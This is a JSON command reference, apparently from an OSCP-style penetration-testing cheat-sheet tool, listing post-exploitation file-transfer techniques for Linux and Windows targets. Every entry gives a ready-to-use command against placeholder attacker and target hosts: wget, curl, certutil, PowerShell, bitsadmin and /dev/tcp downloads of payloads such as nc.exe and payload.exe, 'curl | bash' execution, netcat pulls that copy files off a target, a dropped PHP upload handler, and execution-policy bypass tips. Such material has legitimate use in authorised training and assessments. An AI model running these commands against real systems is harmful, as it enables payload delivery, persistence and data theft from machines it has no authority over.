{
  "category": "post-exploit",
  "subcategory": "file-transfer",
  "description": "File transfer methods for Linux and Windows targets",
  "commands": [
    {
      "id": "file-transfer-python-http",
      "name": "Python HTTP Server (Download from Target)",
      "category": "post-exploit",
      "subcategory": "file-transfer",
      "command": "python3 -m http.server <PORT>",
      "description": "Start HTTP server on attacker machine for file downloads",
      "variables": [
        {
          "name": "<PORT>",
          "description": "Port to serve HTTP on",
          "example": "8000",
          "required": true
        }
      ],
      "flag_explanations": {
        "-m http.server": "Run HTTP server module",
        "PORT": "Port to listen on (default 8000)"
      },
      "tags": ["OSCP:HIGH", "QUICK_WIN", "BOTH_OS"],
      "oscp_relevance": "high",
      "success_indicators": [
        "Serving HTTP on port shown",
        "File requests logged"
      ],
      "failure_indicators": [
        "Port already in use",
        "Permission denied on port"
      ],
      "next_steps": [
        "On Linux target: wget http://<LHOST>:<PORT>/file",
        "On Windows target: certutil -urlcache -f http://<LHOST>:<PORT>/file file",
        "Monitor server for successful downloads"
      ],
      "alternatives": [
        "python -m SimpleHTTPServer 8000 (Python 2)",
        "php -S 0.0.0.0:8000",
        "ruby -run -e httpd . -p 8000"
      ],
      "notes": "Run in directory containing files to transfer"
    },
    {
      "id": "file-transfer-wget",
      "name": "Linux: wget Download",
      "category": "post-exploit",
      "subcategory": "file-transfer",
      "command": "wget http://<LHOST>:<PORT>/<FILE> -O <OUTPUT>",
      "description": "Download file using wget on Linux target",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "HTTP server port",
          "example": "8000",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to download",
          "example": "linpeas.sh",
          "required": true
        },
        {
          "name": "<OUTPUT>",
          "description": "Output filename",
          "example": "/tmp/linpeas.sh",
          "required": true
        }
      ],
      "flag_explanations": {
        "-O": "Output file name",
        "-q": "Quiet mode (suppress output)",
        "--no-check-certificate": "Skip SSL certificate validation"
      },
      "tags": ["LINUX", "OSCP:HIGH"],
      "oscp_relevance": "high",
      "success_indicators": [
        "File downloaded successfully",
        "100% completion shown",
        "File exists on target"
      ],
      "failure_indicators": [
        "Connection refused",
        "wget: command not found",
        "Cannot write to output file"
      ],
      "alternatives": [
        "curl http://<LHOST>/<FILE> -o <OUTPUT>",
        "Use /dev/tcp for raw download",
        "Base64 encode and paste if no tools"
      ],
      "notes": "Add --no-check-certificate for HTTPS without valid cert"
    },
    {
      "id": "file-transfer-curl",
      "name": "Linux: curl Download",
      "category": "post-exploit",
      "subcategory": "file-transfer",
      "command": "curl http://<LHOST>:<PORT>/<FILE> -o <OUTPUT>",
      "description": "Download file using curl on Linux target",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "HTTP server port",
          "example": "8000",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to download",
          "example": "exploit.sh",
          "required": true
        },
        {
          "name": "<OUTPUT>",
          "description": "Output filename",
          "example": "/tmp/exploit.sh",
          "required": true
        }
      ],
      "flag_explanations": {
        "-o": "Output file name",
        "-k": "Allow insecure SSL connections",
        "-s": "Silent mode",
        "-L": "Follow redirects"
      },
      "tags": ["LINUX", "OSCP:HIGH"],
      "oscp_relevance": "high",
      "success_indicators": [
        "File downloaded",
        "Exit code 0"
      ],
      "failure_indicators": [
        "curl: command not found",
        "Failed to connect",
        "Permission denied"
      ],
      "alternatives": [
        "wget if curl unavailable",
        "curl <URL> | bash (pipe to shell)",
        "Use -k for self-signed certificates"
      ],
      "notes": "curl -L follows redirects, useful for shortened URLs"
    },
    {
      "id": "file-transfer-certutil",
      "name": "Windows: certutil Download",
      "category": "post-exploit",
      "subcategory": "file-transfer",
      "command": "certutil -urlcache -f http://<LHOST>:<PORT>/<FILE> <OUTPUT>",
      "description": "Download file using certutil (Windows native tool)",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "HTTP server port",
          "example": "8000",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to download",
          "example": "nc.exe",
          "required": true
        },
        {
          "name": "<OUTPUT>",
          "description": "Output filename",
          "example": "C:\\\\temp\\\\nc.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "-urlcache": "Use URL cache",
        "-f": "Force overwrite existing file",
        "-split": "Download and split file"
      },
      "tags": ["WINDOWS", "OSCP:HIGH", "QUICK_WIN"],
      "oscp_relevance": "high",
      "success_indicators": [
        "File downloaded successfully",
        "No error messages"
      ],
      "failure_indicators": [
        "Connection failed",
        "Access denied",
        "Antivirus blocked"
      ],
      "alternatives": [
        "PowerShell download methods",
        "bitsadmin download",
        "SMB copy if shares available"
      ],
      "notes": "Native Windows tool, often bypasses basic restrictions"
    },
    {
      "id": "file-transfer-powershell-download",
      "name": "Windows: PowerShell Download File",
      "category": "post-exploit",
      "subcategory": "file-transfer",
      "command": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://<LHOST>:<PORT>/<FILE>', '<OUTPUT>')\"",
      "description": "Download file using PowerShell WebClient",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "HTTP server port",
          "example": "8000",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to download",
          "example": "payload.exe",
          "required": true
        },
        {
          "name": "<OUTPUT>",
          "description": "Output path",
          "example": "C:\\\\temp\\\\payload.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "-c": "Execute command",
        "New-Object System.Net.WebClient": "Create web client object",
        "DownloadFile": "Method to download file"
      },
      "tags": ["WINDOWS", "OSCP:HIGH"],
      "oscp_relevance": "high",
      "success_indicators": [
        "File appears on disk",
        "No error output"
      ],
      "failure_indicators": [
        "Execution policy blocked",
        "AMSI flagged script",
        "Network error"
      ],
      "alternatives": [
        "Invoke-WebRequest -Uri <URL> -OutFile <FILE>",
        "wget <URL> -O <FILE> (PowerShell alias)",
        "curl <URL> -o <FILE> (PowerShell alias)"
      ],
      "notes": "Add -ep bypass if execution policy blocks: powershell -ep bypass -c \"...\""
    },
    {
      "id": "file-transfer-scp",
      "name": "Linux: SCP Transfer",
      "category": "post-exploit",
      "subcategory": "file-transfer",
      "command": "scp <FILE> <USER>@<TARGET>:<DEST>",
      "description": "Securely copy file to target via SSH",
      "variables": [
        {
          "name": "<FILE>",
          "description": "Local file to transfer",
          "example": "/tmp/exploit.sh",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username on target",
          "example": "user",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP address",
          "example": "192.168.45.100",
          "required": true
        },
        {
          "name": "<DEST>",
          "description": "Destination path",
          "example": "/tmp/exploit.sh",
          "required": true
        }
      ],
      "flag_explanations": {
        "-P": "Specify SSH port (if not 22)",
        "-i": "Use specific SSH key",
        "-r": "Recursively copy directory"
      },
      "tags": ["LINUX", "OSCP:MEDIUM"],
      "oscp_relevance": "medium",
      "success_indicators": [
        "100% transfer completion",
        "File appears on target"
      ],
      "failure_indicators": [
        "Permission denied",
        "Connection refused",
        "Host key verification failed"
      ],
      "alternatives": [
        "Use with -i for SSH key: scp -i key.pem file target:/path",
        "rsync for larger transfers",
        "SFTP for interactive transfer"
      ],
      "notes": "Requires SSH access to target"
    },
    {
      "id": "file-transfer-smb",
      "name": "Windows: SMB Transfer",
      "category": "post-exploit",
      "subcategory": "file-transfer",
      "command": "copy \\\\<LHOST>\\<SHARE>\\<FILE> <DEST>",
      "description": "Copy file from SMB share on attacker machine",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP with SMB share",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<SHARE>",
          "description": "SMB share name",
          "example": "share",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to copy",
          "example": "nc.exe",
          "required": true
        },
        {
          "name": "<DEST>",
          "description": "Destination path",
          "example": "C:\\\\temp\\\\nc.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "\\\\\\\\": "UNC path format",
        "net use": "Map network drive if needed"
      },
      "tags": ["WINDOWS", "OSCP:HIGH"],
      "oscp_relevance": "high",
      "success_indicators": [
        "1 file(s) copied",
        "File exists at destination"
      ],
      "failure_indicators": [
        "Network path not found",
        "Access denied",
        "SMB blocked by firewall"
      ],
      "alternatives": [
        "impacket-smbserver share . -smb2support (attacker)",
        "net use Z: \\\\\\\\<LHOST>\\\\<SHARE>",
        "Run directly: \\\\\\\\<LHOST>\\\\share\\\\file.exe"
      ],
      "notes": "Setup SMB server: impacket-smbserver share $(pwd) -smb2support -username user -password pass"
    },
    {
      "id": "file-transfer-nc-push",
      "name": "Netcat: Push File to Target",
      "category": "post-exploit",
      "subcategory": "file-transfer",
      "command": "nc -lvnp <PORT> < <FILE>",
      "description": "Push file to target using netcat (target connects)",
      "variables": [
        {
          "name": "<PORT>",
          "description": "Port to listen on",
          "example": "4444",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to send",
          "example": "exploit.sh",
          "required": true
        }
      ],
      "flag_explanations": {
        "-l": "Listen mode",
        "-v": "Verbose output",
        "-n": "No DNS resolution",
        "-p": "Specify port",
        "<": "Redirect file as input"
      },
      "tags": ["BOTH_OS", "OSCP:HIGH"],
      "oscp_relevance": "high",
      "success_indicators": [
        "Connection received from target",
        "File bytes sent"
      ],
      "failure_indicators": [
        "No connection",
        "Port already in use"
      ],
      "next_steps": [
        "On target run: nc <LHOST> <PORT> > <FILE>",
        "Verify file size matches",
        "Make executable if needed: chmod +x"
      ],
      "alternatives": [
        "ncat for newer systems",
        "/dev/tcp for bash-based transfer",
        "socat for bidirectional transfer"
      ],
      "notes": "Target command: nc <LHOST> <PORT> > output_file"
    },
    {
      "id": "file-transfer-nc-pull",
      "name": "Netcat: Pull File from Target",
      "category": "post-exploit",
      "subcategory": "file-transfer",
      "command": "nc -lvnp <PORT> > <FILE>",
      "description": "Receive file from target using netcat",
      "variables": [
        {
          "name": "<PORT>",
          "description": "Port to listen on",
          "example": "4444",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "Output filename",
          "example": "data.txt",
          "required": true
        }
      ],
      "flag_explanations": {
        "-l": "Listen mode",
        "-v": "Verbose",
        "-n": "Numeric IPs only",
        "-p": "Port",
        ">": "Redirect output to file"
      },
      "tags": ["BOTH_OS", "OSCP:MEDIUM"],
      "oscp_relevance": "medium",
      "success_indicators": [
        "Connection from target",
        "File received and saved"
      ],
      "failure_indicators": [
        "No connection",
        "Incomplete transfer"
      ],
      "next_steps": [
        "On target: nc <LHOST> <PORT> < <FILE>",
        "Compare file hashes to verify integrity"
      ],
      "alternatives": [
        "socat TCP-LISTEN:port,reuseaddr,fork file:output",
        "Use base64 encoding for text-safe transfer"
      ],
      "notes": "Target sends with: nc <LHOST> <PORT> < file_to_send"
    },
    {
      "id": "file-transfer-base64",
      "name": "Base64 Encode/Decode Transfer",
      "category": "post-exploit",
      "subcategory": "file-transfer",
      "command": "base64 <FILE> | nc <TARGET> <PORT>",
      "description": "Transfer file encoded as base64 (safe for text channels)",
      "variables": [
        {
          "name": "<FILE>",
          "description": "File to encode and transfer",
          "example": "payload.exe",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.45.100",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "Port target is listening on",
          "example": "4444",
          "required": true
        }
      ],
      "flag_explanations": {
        "base64": "Encode file to base64",
        "|": "Pipe to netcat",
        "base64 -d": "Decode base64 (on target)"
      },
      "tags": ["BOTH_OS", "OSCP:MEDIUM"],
      "oscp_relevance": "medium",
      "success_indicators": [
        "Base64 string transferred",
        "File decoded successfully on target"
      ],
      "failure_indicators": [
        "Encoding failed",
        "Decoding errors on target"
      ],
      "next_steps": [
        "On target (Linux): nc -lvnp <PORT> | base64 -d > file",
        "On target (Windows): certutil -decode input.b64 output.exe",
        "Verify with MD5 checksum"
      ],
      "alternatives": [
        "Hex encode for even safer transfer",
        "Split large files and transfer in chunks",
        "Copy-paste base64 if no network tools"
      ],
      "notes": "Windows decode: certutil -decode input.b64 output.exe"
    },
    {
      "id": "file-transfer-php",
      "name": "PHP Upload Script",
      "category": "post-exploit",
      "subcategory": "file-transfer",
      "command": "echo '<?php file_put_contents($_FILES[\"file\"][\"name\"], file_get_contents($_FILES[\"file\"][\"tmp_name\"])); ?>' > upload.php",
      "description": "Create simple PHP upload handler on target web server",
      "variables": [],
      "flag_explanations": {
        "file_put_contents": "Write file to disk",
        "$_FILES": "Access uploaded file",
        "tmp_name": "Temporary upload location"
      },
      "tags": ["LINUX", "OSCP:MEDIUM"],
      "oscp_relevance": "medium",
      "success_indicators": [
        "upload.php created",
        "Files can be uploaded via POST"
      ],
      "failure_indicators": [
        "Cannot write to web directory",
        "PHP disabled"
      ],
      "next_steps": [
        "Upload with: curl -F file=@local.txt http://target/upload.php",
        "Or use browser form",
        "Check file appears in web directory"
      ],
      "alternatives": [
        "Use existing file upload functionality",
        "Python Flask upload server",
        "Updog for quick HTTP upload server"
      ],
      "notes": "Place in web-accessible directory, use curl -F to upload"
    },
    {
      "id": "file-transfer-ftp",
      "name": "FTP Transfer",
      "category": "post-exploit",
      "subcategory": "file-transfer",
      "command": "ftp <TARGET>",
      "description": "Transfer files via FTP (if FTP server available)",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "FTP server IP",
          "example": "192.168.45.100",
          "required": true
        }
      ],
      "flag_explanations": {
        "binary": "Set binary transfer mode",
        "get": "Download file from server",
        "put": "Upload file to server",
        "mget": "Download multiple files"
      },
      "tags": ["BOTH_OS", "OSCP:LOW"],
      "oscp_relevance": "low",
      "success_indicators": [
        "FTP connection established",
        "File transferred successfully"
      ],
      "failure_indicators": [
        "Connection refused",
        "Authentication failed"
      ],
      "next_steps": [
        "Switch to binary mode: binary",
        "Upload: put local_file remote_file",
        "Download: get remote_file local_file"
      ],
      "alternatives": [
        "Setup Python FTP server: python -m pyftpdlib -p 21",
        "TFTP for simpler transfers",
        "SFTP for encrypted transfers"
      ],
      "notes": "Setup FTP server: python -m pyftpdlib -p 21 -w"
    },
    {
      "id": "file-transfer-bitsadmin",
      "name": "Windows: bitsadmin Download",
      "category": "post-exploit",
      "subcategory": "file-transfer",
      "command": "bitsadmin /transfer job /download /priority high http://<LHOST>:<PORT>/<FILE> <OUTPUT>",
      "description": "Download file using Windows BITS service",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "HTTP server port",
          "example": "8000",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to download",
          "example": "payload.exe",
          "required": true
        },
        {
          "name": "<OUTPUT>",
          "description": "Output path",
          "example": "C:\\\\temp\\\\payload.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "/transfer": "Create transfer job",
        "/download": "Download mode",
        "/priority high": "High priority transfer"
      },
      "tags": ["WINDOWS", "OSCP:MEDIUM"],
      "oscp_relevance": "medium",
      "success_indicators": [
        "Transfer job completed",
        "File exists at output path"
      ],
      "failure_indicators": [
        "Job failed",
        "Connection error",
        "BITS service disabled"
      ],
      "alternatives": [
        "certutil for simpler syntax",
        "PowerShell download methods",
        "mshta for HTML application downloads"
      ],
      "notes": "BITS runs in background, can be slower than certutil"
    },
    {
      "id": "file-transfer-dev-tcp",
      "name": "Linux: /dev/tcp Download",
      "category": "post-exploit",
      "subcategory": "file-transfer",
      "command": "cat < /dev/tcp/<LHOST>/<PORT> > <OUTPUT>",
      "description": "Download file using bash /dev/tcp (no external tools needed)",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "Port with file server",
          "example": "4444",
          "required": true
        },
        {
          "name": "<OUTPUT>",
          "description": "Output filename",
          "example": "/tmp/file",
          "required": true
        }
      ],
      "flag_explanations": {
        "/dev/tcp": "Bash TCP pseudo-device",
        "cat <": "Read from TCP connection",
        "> file": "Write to output file"
      },
      "tags": ["LINUX", "OSCP:MEDIUM"],
      "oscp_relevance": "medium",
      "success_indicators": [
        "File downloaded",
        "Connection successful"
      ],
      "failure_indicators": [
        "/dev/tcp not supported",
        "Connection refused",
        "Bash feature disabled"
      ],
      "next_steps": [
        "On attacker: nc -lvnp <PORT> < file",
        "On target: cat < /dev/tcp/<IP>/<PORT> > output"
      ],
      "alternatives": [
        "exec 3<>/dev/tcp/<IP>/<PORT>; cat <&3 > file",
        "Use wget/curl if available"
      ],
      "notes": "Works when wget/curl unavailable; requires bash with /dev/tcp enabled"
    }
  ]
}
